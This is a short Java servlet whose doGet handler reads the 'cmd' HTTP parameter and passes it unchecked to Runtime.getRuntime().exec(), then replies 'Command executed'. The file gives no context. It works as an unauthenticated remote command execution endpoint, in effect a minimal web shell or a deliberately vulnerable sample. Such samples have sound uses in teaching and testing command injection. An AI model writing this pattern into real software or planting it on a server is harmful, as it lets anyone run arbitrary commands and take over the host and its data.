import java.io.*;
import javax.servlet.http.*;

public class CommandHandler extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        String cmd = request.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);

        PrintWriter out = response.getWriter();
        out.println("Command executed");
    }
}
